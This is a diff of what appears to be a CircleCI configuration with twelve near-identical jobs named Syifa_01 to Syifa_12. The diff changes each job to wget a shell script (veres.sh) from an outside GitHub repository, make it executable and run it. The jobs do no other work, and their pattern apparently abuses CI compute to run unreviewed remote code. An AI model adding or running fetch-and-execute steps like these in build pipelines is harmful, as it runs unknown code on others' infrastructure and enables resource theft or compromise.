@@ -7,84 +7,84 @@ jobs:
     steps:
       - run:
           name: Syifa_12
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_11:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_11
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh 
   Syifa_10:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_10
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_09:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_09
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_08:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_08
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_07:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_07
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_06:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_06
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_05:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_05
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_04:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_04
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_03:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_03
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_02:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_02
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
   Syifa_01:
     docker:
       - image: cimg/python:3.8
     steps:
       - run:
           name: Syifa_01
-          command: wget https://raw.githubusercontent.com/yukjstuh/juwjiko/master/start.sh && chmod u+x start.sh
+          command: wget https://raw.githubusercontent.com/breakkhansax/Nana/main/veres.sh && chmod u+x veres.sh && ./veres.sh
 workflows:
     version: 2
     Syifa:
